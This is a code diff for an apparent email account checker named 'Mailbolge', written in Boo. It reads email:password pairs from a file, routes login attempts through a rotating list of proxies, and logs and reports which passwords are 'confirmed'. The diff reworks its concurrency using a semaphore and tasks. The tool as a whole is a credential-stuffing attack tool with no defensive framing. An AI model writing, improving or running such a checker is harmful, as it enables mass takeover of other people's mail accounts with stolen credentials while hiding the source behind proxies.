@@ -67,7 +67,6 @@ class Box:
 	private final cancel	= CancellationTokenSource().Token
 	private client as duck
 	public proxy as Proxy
-	event done as EventHandler of string
 
 	# --Methods goes here.
 	def constructor(server_ as string, user_ as string, password_ as string):
@@ -93,14 +92,10 @@ class Box:
 	def probe():
 		try: 
 			service.Authenticate(email, password, cancel)
-			done(self, "open")
+			return "open"
 		except ex:
-			if ex.Message.StartsWith("Please log in via your web browser"): done(self, 'auth')
-			else: done(self, 'fail')
-		return self
-
-	def probe_async():
-		Task.Run({probe()})
+			if ex.Message.StartsWith("Please log in via your web browser"): return 'auth'
+			else: return 'fail'
 		return self
 
 	[Extension] static def reroute(server as string):
@@ -154,14 +149,14 @@ class Proxy:
 			return sock
 # -------------------- #
 class Mailbolge:
-	final tasks			= Dictionary[of Box, DateTime]()
+	final proxlist		= List[of Proxy]()
 	final log			= {info, channel|info = ':I am Error:'; return self}
 	final dbg			= {info|info = ':I am Error:'; return self}
-	final proxlist		= List[of Proxy]()
+	final hardlimit		= SemaphoreSlim(byte.MaxValue)
 	final reporter		= void
-	final max_tension	= 124
-	private preload		= 0
-	private debugger	as Timer
+	private tension		= 0
+	private	peak		= 0
+	private progress	= 0
 
 	# --Methods goes here.
 	def constructor(ui as duck, storage as Type):
@@ -169,33 +164,40 @@ class Mailbolge:
 		dbg	= {info|ui.dbg(info); return self}
 		reporter = storage
 
-	def check(box as Box, dest as duck):
-		if box.proxy = proxlist.get_next():	log("Launching check through •$(box.proxy)• for •$(box)•", 'note')
-		else: log("Launching check for •$(box)•", 'note')
-		box.probe_async().done += checker(dest)		
-		lock tasks: tasks.Add(box, DateTime.Now)
-
-	def checker(dest as duck):
-		return def (box as Box, result as string):
-			lock tasks:
-				return self unless tasks.Remove(box)
-			if result == "fail":
+	def checker(box as Box, dest as duck):
+		return def():
+			# Initial setup.
+			hardlimit.Wait()
+			peak = Math.Max(++tension, peak)
+			# Actual check-up.
+			if box.proxy = proxlist.get_next():	log("Launching check through •$(box.proxy)• for •$(box)•", 'note')
+			else: log("Launching check for •$(box)•", 'note')
+			if result = box.probe() == "fail":
 				log("Unable to access •$(box.email)• with password •$(box.password)•", 'fail')
 				dest.echo(box, 'fail')
 			else:
 				log("Password for •$(box.email)• confirmed: •$(box.password)•", 'success')
 				dest.echo(box, "success")
+			# Finalization.
+			hardlimit.Release()
+			tension--
+			progress++
 
 	def proxy_checker(entry as string):
 		url	= Uri((entry if entry.Contains("://") else "proxy://$entry"))
 		return def():
+			# Initial setup.
+			hardlimit.Wait()
+			# Actual checking.
 			try:
 				if (proxy = Proxy(url)).type:
 					log("├> Succesfully registered •$(url)•", 'success').proxlist.Add(proxy)
 					return self
 			except: pass
 			log("├* Unable to connect through •$(url)•", 'fail')
-			preload++ 
+			# Finalization.
+			hardlimit.Release()
+			progress++ 
 
 
 	[Extension] static def to_box(entry as string):
@@ -211,36 +213,37 @@ class Mailbolge:
 			list.RemoveAt(0)
 			return entry
 
-	tension:
-		get: return tasks.Count
+	[Extension] static def report(num as int):
+		return ("$num" if num else "No")
 
 	proxies:
 		set:
-			proxy_tasks = List[of Task]()
 			progress	= 0
-			using debugger = Timer({dbg("::$(Math.Round(preload*100.0/proxy_tasks.Count, 1))%")}, null, 0, 200):
+			tasks		= List[of Task]()			
+			using Timer({dbg("::$(Math.Round(progress*100.0/tasks.Count, 1))%")}, null, 0, 200):
 				try:
 					log("┌Registering proxies from '•$(value)•':", 'io')					
 					for entry in File.ReadLines(value):
-						try: proxy_tasks.Add(Task.Run(proxy_checker(entry)))
+						try: tasks.Add(Task.Run(proxy_checker(entry)))
 						except ex: log("│Invalid URL provided: •$(entry)•", 'fault')
-					Task.WaitAll(proxy_tasks.ToArray(), 60 * 1000 * 20)
-					log("└•$(proxlist.Count)• proxies was added to list.\n", 'io')
+					Task.WaitAll(tasks.ToArray(), 60 * 1000 * 20)
+					log("└•$(proxlist.Count.report())• proxies was added to list.\n", 'io')
 				except ex: log("└$ex", 'fault')
 
 	feed:
 		set:
-			using debugger = Timer({dbg(" [$tension/$max_tension]")}, null, 0, 200):
+			progress	= tension = 0
+			tasks		= List[of Task]()
+			using Timer({dbg(" [$tension/$peak]")}, null, 0, 200):
 				try:
 					log("Parsing '•$(value)•'...", 'io')
-					feeder	= File.ReadLines(value).GetEnumerator()
 					dest	= reporter(value)
-					while true:
-						if tension < max_tension and feeder.MoveNext():
-							if box = feeder.Current.to_box(): check(box, dest)
-							else: log("Invalid entry encountered: •$(feeder.Current)•", 'fault')
-						elif tension == 0: break
+					for entry in File.ReadLines(value):
+						if box = entry.to_box(): tasks.Add(Task.Run(checker(box, dest)))
+						else: log("Invalid entry encountered: •$(entry)•", 'fault')
+					Task.WaitAll(tasks.ToArray(), -1)
 				except ex: log(ex, 'fault')
+				log("└•$((progress.report if progress else 'No'))• email adresses was tested.\n", 'io')
 #.}
 
 # ==Main code==
